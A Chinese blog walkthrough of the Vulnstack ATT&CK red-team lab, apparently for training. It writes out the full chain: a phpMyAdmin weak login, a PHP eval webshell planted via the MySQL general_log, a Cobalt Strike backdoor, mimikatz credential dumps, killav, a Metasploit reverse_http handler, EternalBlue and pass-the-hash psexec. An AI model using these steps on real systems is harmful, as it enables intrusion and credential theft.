# 原创
：  从WEB到内网横向&&CS后渗透&&MSF后渗透&&哈希传递------ATK&CK红队评估（一）

# 从WEB到内网横向&amp;&amp;CS后渗透&amp;&amp;MSF后渗透&amp;&amp;哈希传递------ATK&amp;CK红队评估（一）

ATK&amp;CK红队评估（一）<br/> 环境下载地址：[`http://vulnstack.qiyuanxuetang.net/vuln/detail/2/`](http://vulnstack.qiyuanxuetang.net/vuln/detail/2/)

### 环境搭建

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c3d4251d0a8992be3e93e01e900f107b.jpeg"/><br/> 三台虚拟主机默认开机密码都是 hongrisec@2019<br/> win2003和win2008可能会提示密码过期，自己修改即可。

#### 网络拓扑

<img alt="Network Diagram.png" src="https://img-blog.csdnimg.cn/img_convert/fec1674d232fb361743e39aa1691ca59.jpeg"/><br/> win7服务器就是网关，要配置两张网卡，一张对外提供web服务，一张通向内网。<br/> 1.vmware中给win7添加一张网卡。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/78f96e6d4dd666aa2e59511411152c64.jpeg"/><br/> 2.将网络适配器 1 设置成 VMnet1 仅主机模式（内网），网络适配器 2 设置成 NAT 模式（外网）<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2b6118fc5fc06d1a90f4289aa2d2bbf5.jpeg"/><br/> 3.将win2003、win2008 网络适配器设置成VMnet1仅主机模式(内网)。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c84a3d904b41c6af007f1d28e9288e77.jpeg"/><br/> 登录查看三台主机ip。<br/> win7：192.168.52.143（内）/192.168.126.188（外）<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9741720fdab1ce99dbdc21212db1ff58.jpeg"/><br/> win2003：192.168.52.141<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d388f70f72b9b8138ab1f072fb54054e.jpeg"/><br/> win2008：192.168.52.138<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3c7173ce96d735dfd41bcd75a921897d.jpeg"/><br/> 攻击机kali：192.168.126.130<br/> 用win7ping一下kali，看是否通。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9a457c51b4d9134bdf97852495bedafc.jpeg"/>

在win7里找到phpstudy开启web服务。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/99426e759aa097f7fbead091710c51d5.jpeg"/>

### 信息收集

nmap端口扫描：<br/> `nmap --min-rate 10000 -p- 192.168.126.188`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2ca01143b6ac2f66ad2a43f49aaaf3da.jpeg"/><br/> `nmap -p 80,3306 -sV 192.168.126.188`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b2f7075411c9b3d8ce976527c98a231a.jpeg"/><br/> 可以看到目标开放了80,3306端口<br/> 80-http<br/> 3306-mysql<br/> 访问192.168.126.188:80<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e1c022f7dc765e5c35146cd36a65ead3.jpeg"/><br/> 啥都没有，dirsearch扫一下目录。<br/> `dirsearch -u http://192.168.126.188`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d1f526ec357f6ef1442acfac45c7fedb.jpeg"/>

### 攻击尝试

主要是phpmyadmin。访问一下，尝试弱口令登录。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/273fb93a285eaad50ac2f52d730b0073.jpeg"/><br/> 试了几次就成功登录了，root/root标准的弱口令，如果猜不出来直接上字典爆破。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0d7f0700f93cec747695081990300b81.jpeg"/><br/> 在php探针中得知网站绝对路径C:/phpStudy/WWW<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7679e8c3cd5e8eac44939a05aed23a0a.jpeg"/>

#### phpmyadmin后台getshell

最常用的就是into outfile写入木马了，当然还有利用Mysql日志文件getshell。

##### 1.into outfile写入木马

已经知道了网站绝对路径，直接写入试试。<br/> `select '&lt;?php eval($_POST[cmd]);?&gt;' into outfile 'C:/phpStudy/www/shell.php';`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0ca8f791d782586dd1e1929f4fe3d1aa.jpeg"/><br/> 失败。应该是secure_file_priv的值为NULL，导致不被允许读取任何文件。可以查看一下：<br/> `show global variables like '%secure%';`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/74e6466edf8b24c0da1872d646ae503f.jpeg"/><br/> 果然是NULL，不允许into outfile方式写入木马，那就试一下日志文件getshell。

##### Mysql日志文件写入shell

查看日志状态：<br/> `show variables like '%general%';`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/cbc05c488b0ce1435a132e00e898a54b.jpeg"/><br/> general_log为off，MySQL不在写入日志，需要将它打开。打开后，操作都将记录在general_log_file指定的文件目录中。<br/> `SET GLOBAL general_log='on';`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b499e527caba392ffe48b8efcb39e72e.jpeg"/><br/> 指定日志写入shell.php中<br/> `SET GLOBAL general_log_file='C:/phpStudy/www/shell.php';`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7e1266d7db9c8ef4a10858a0d076b112.jpeg"/><br/> 再看一下日志状态：<br/> `show variables like '%general%';`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/03c123786d355449a632cdd58f80edc9.jpeg"/><br/> 现在直接把一句话木马写入shell.php中，只需要select一下木马，日志就会将它写入shell.php中：<br/> `SELECT '&lt;?php eval($_POST["cmd"]);?&gt;';`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/f7e981362397fa810b57dac946303741.jpeg"/><br/> 有了后门就直接试一下蚁剑链接。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/bc55d8453ff89a339c8b95aeed1808d0.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/233cd47635dc5185694c377d2f628a7d.jpeg"/>

### 内网渗透

#### cs植入后门

1.生成exe后门。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e72e2b80393c94cb594216911c1e7cb1.jpeg"/><br/> 生成后的exe使用蚁剑进行上传到靶机<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/070ea3de26af2c6bb2eb96b472602d9b.jpeg"/><br/> 在蚁剑的shell中执行后门：<br/> `start artifact.exe`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a5bc8a4928b9e62833d7b70226787e58.jpeg"/><br/> cs可以看到目标已经上线。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4e50a51a425f6dc48a61a9290b9f398f.jpeg"/><br/> MS14-058提权：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e8ab7056386eb09e7c806697767c06ed.jpeg"/><br/> 成功提到system权限<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fbbdf6c974fdb685668d721e2e68c693.jpeg"/><br/> 先将心跳时间设置为3s，实战中不能过快。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1ef3f050835f68c0ee1faaba3fc90ead.jpeg"/>

#### 信息收集

```
whoami
net start 
ipconfig /all   #查看本机ip，所在域
route print     #打印路由信息
net view        # 查看局域网内其他主机名
net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user        # 查看本机用户列表
net user /domain         # 查看域用户
net localgroup administrators # 查看本地管理员组
net view /domain         # 查看有几个域
net group 组名 /domain    # 查看域中某工作组
net user 用户名 /domain   # 获取指定域用户的信息
net group "domain admins" /domain  # 查看域管理员
net group "domain computers" /domain  # 查看域中的其他主机名
net group "doamin controllers" /domain  # 查看域控
wmic useraccount get /all        #获取域内用户的详细信息


```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2ce44d3f6d91abffbe7f6c7691fd4b54.jpeg"/><br/> 有god.org的域<br/> `shell net config Workstation`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8028dd155c397b3a171ad7563cdc8d42.jpeg"/><br/> 查看域信息：`shell net view`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d30bbcd86205d976bc5598eb36ee92fc.jpeg"/><br/> 查看主域信息：`shell net view /domain`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d25ae8ee2bfacdb8e11278241fe8bea5.jpeg"/><br/> 查询当前的登录域与用户信息：`shell net config workstation`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/220a58843d8984ab5a8d972fbd09f278.jpeg"/><br/> 域控的域名即 owa.god.org ，用 ping 即可反查出域控ip为192.168.52.138<br/> 获取域内用户的详细信息：`shell wmic useraccount get /all`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/37601e7ac6b8df8516b5311de0950a70.jpeg"/><br/> mimikatz抓取hash和明文密码，然后查看密码凭证<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/6fbba8a137dc91242dc7765c31bc97e1.jpeg"/><br/> 用CS的hashdump去读内存密码，用mimakatz读注册表密码：logonpasswords<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/bf0ff6c7094adbf2794b18ab42647d1d.jpeg"/><br/> 探测内网其他主机<br/> `for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr "TTL="`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/dc71146f47726839410241ef48f8a4c5.jpeg"/><br/> 信息收集结果：

域名：god.org<br/> 域内五个用户：Administrator、Guest、liukaifeng01、krbtgt、ligang<br/> 域内三台主机：OWA、ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)<br/> 域控：OWA(192.168.52.138)<br/> win7内网ip：192.168.52.143

### CS 横向移动

通过net view看到还有两个域用户。OWA和ROOT-TVI862UBEH。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/bb082d57111292024398365bc6344701.jpeg"/><br/> 新建一个listener,payload设置为Beacon SMB:<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/cfbe82033fcdb638049bbf2e018451b3.jpeg"/><br/> 已有的beacon上右键spawn生成会话，进行派生<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3ddf6f71a10fd48408b4153df0f62e31.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/db7fa89349b6def607fea2d90b93eb01.jpeg"/><br/> 成功后这里又会一个这样的标识。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/da93ff8c14afd7389af22d6813e909e7.jpeg"/><br/> 回到target列表，又键非域控主机，使用psexec横向。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9e44f4703fed99895ad639458a3c82df.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a6bc111aba93289ad9ee9254bae3ef44.jpeg"/><br/> 成功上线ROOT-TVI862UBEH<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ca7860c80cf4d7375faaaf92163db02b.jpeg"/><br/> 同理上线OWA<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/135c42c9aa62d2d0a9b441ea48d1e7d5.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1818bf6138f54e8dd5c85d7409359a8b.jpeg"/><br/> 三台目标机器全部拿下。

### MSF横向移动

#### 1.msf开启监听

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.126.130
set lport 6666
run

```

cs创建一个listener<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a5853a525b80b7864d54bd3bb08d3d8b.jpeg"/><br/> 蚁剑上传木马到目标靶机然后执行。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3ec6a7da95c7ceb617d1ac1a516168c3.jpeg"/><br/> 检查主机是否运行在虚拟机上：<br/> `run post/windows/gather/checkvm`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ea82b658dd4c48d0d81a318ac9243ced.jpeg"/><br/> 关掉主机杀毒软件：<br/> `run post/windows/manage/killav`<br/> 获取目标详情：<br/> `sysinfo`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b5c0646c6929d829b43917039aa9dbbe.jpeg"/><br/> 配置静态路由<br/> `run post/multi/manage/autoroute` #加载autoroute模块，探测当前机器所有网段信息<br/> `run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD` #添加目标内网路由

#### 2.扫描漏洞（ms17-010）

使用msf直接扫描域控win2008：

```
use auxiliary/scanner/portscan/tcp
set rhost 192.158.52.138
set ports 80,135-139,445,3306,3389
run

```

```
search ms17_010
use auxiliary/scanner/smb/smb_ms17-010
set rhosts 192.168.52.138
run

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8f31fb30a0e47d55da474843dabf9da3.jpeg"/><br/> 存在漏洞。<br/> 利用

```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set rhosts 192.168.52.138
run

```

失败。

#### 哈希传递攻击(PTH)

`hashdump`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7930d784b9e10a5ff7f48778a9441d9c.jpeg"/><br/> `load kiwi`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ac325c822d80913bb7d414b29c92ec0c.jpeg"/><br/> **psexec|hash传递**<br/> 探测445：

```
use auxiliary/scanner/smb/smb_version 
set rhost 192.168.52.138
set threads 40
run
set rhost 192.168.52.141
run

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/20d48a97149d5bb0561abc1a6c779ee4.jpeg"/><br/> exploit/windows/smb/psexec模块哈希传递攻击 Windows Server 2008

```
use exploit/windows/smb/psexec
set rhosts 192.168.126.188
set SMBUser administrator 
set smbpass 00000000000000000000000000000000:NTLM值

```

成功
